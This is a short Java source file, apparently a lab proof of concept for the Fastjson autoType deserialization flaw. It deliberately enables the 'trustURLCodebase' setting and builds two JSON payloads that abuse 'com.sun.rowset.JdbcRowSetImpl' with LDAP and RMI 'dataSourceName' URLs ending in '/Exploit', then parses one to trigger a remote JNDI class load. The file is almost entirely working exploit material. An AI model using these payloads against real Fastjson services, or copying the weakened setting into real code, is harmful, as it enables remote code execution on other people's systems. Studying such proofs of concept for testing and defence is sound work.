package cn.eovie.victim;

import com.alibaba.fastjson.JSONObject;

/**
 * Created by earayu on 2017/12/7.
 */
public class SomeFastjsonApp {

    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }

    public static void testJdbcRowSetImpl(){
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        //LADP 方式
        String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," + " \"autoCommit\":true}";
        //RMI 方式
        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        JSONObject.parseObject(payload2);
    }

}
